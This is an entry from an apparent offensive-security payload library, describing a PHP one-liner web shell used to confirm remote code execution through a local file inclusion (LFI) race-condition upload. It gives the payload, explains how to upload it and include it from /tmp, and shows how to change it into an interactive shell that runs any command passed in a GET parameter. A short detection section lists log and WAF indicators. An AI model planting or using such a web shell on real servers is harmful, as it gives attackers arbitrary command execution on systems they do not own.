---
id: new-uuid-for-php-shell
type: code
language: PHP
verified: true
created_at: '2023-04-06T03:55:58.506983+00:00'
updated_at: '2023-04-10T20:22:16.307761+00:00'
tags:
  - php-shell
  - rce-payload
  - lfi-test
platforms:
  - Web
  - PHP
validated: true
---

# PHP-Uptime-Test-Shell

## Code

```php
<?php echo system('uptime');
```

## Description

This is a minimal PHP one-liner shell designed for testing LFI inclusion during a race-condition upload exploit. When included via LFI, it executes the 'uptime' command and outputs server load information, allowing verification of successful execution through the presence of 'load average' in the response.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This is a static one-liner with no placeholders; customize the system() command if needed for different tests. | N/A |

## Usage

Save as shell.php and upload via the race-condition script in the [[procedures/LFI-to-RCE-via-Upload-Race-Condition]] procedure. Once included via LFI (e.g., ?c=/tmp/shell.php), access the URL to trigger execution. For interactive RCE, modify to `<?php system($_GET['cmd'] ?? 'id'); ?>` and append ?cmd=command to requests.

## Detection

- Web server logs showing inclusion of /tmp/ files or PHP execution in temporary directories.
- Anomalous 'uptime' or system command output in HTTP responses.
- File integrity monitoring alerting on unexpected PHP files in /tmp/.
- WAF rules for LFI patterns combined with upload traffic.

## Related

- [[procedures/LFI-to-RCE-via-Upload-Race-Condition]]
